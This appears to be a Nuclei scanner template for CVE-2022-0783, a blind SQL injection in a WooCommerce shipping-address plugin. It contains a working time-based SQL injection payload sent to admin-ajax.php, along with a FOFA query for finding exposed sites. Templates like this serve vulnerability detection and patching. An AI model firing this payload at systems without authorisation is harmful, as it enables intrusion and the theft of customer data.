http:
- matchers:
  - condition: and
    dsl:
    - duration>=7
    - len(body) == 5
    - status_code==200
    - regex('false$', body)
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=ocwma_choice_address&sid=3+AND+(SELECT+1946+FROM+(SELECT(SLEEP(7)))zsme)

    '
id: CVE-2022-0783
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:themehigh:multiple_shipping_addresses_for_woocommerce:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-0783
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.6
    cwe-id: CWE-89
    epss-percentile: 0.97632
    epss-score: 0.48557
  description: 'The Multiple Shipping Address Woocommerce plugin before 2.0 does not
    properly sanitize and escape numerous parameters before using them in SQL statements
    via some AJAX actions available to unauthenticated users, leading to unauthenticated
    SQL injections.

    '
  impact: 'Unauthenticated attackers can execute time-based blind SQL injection to
    extract database contents, potentially exposing sensitive WooCommerce customer
    and order data.

    '
  metadata:
    fofa-query: body="wp-content/plugins/multiple-shipping-address-woocommerce"
    max-request: 1
    product: multiple_shipping_addresses_for_woocommerce
    vendor: themehigh
    verified: true
  name: Multiple Shipping Address Woocommerce < 2.0 - SQL Injection
  reference:
  - https://wpscan.com/vulnerability/4d594424-8048-482d-b61c-45be1e97a8ba/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0783
  remediation: 'Update the Multiple Shipping Address Woocommerce plugin to version
    2.0 or later.

    '
  severity: high
  tags: cve,cve2022,wordpress,wp,wp-plugin,multiple-shipping-address-woocommerce,sqli,vuln
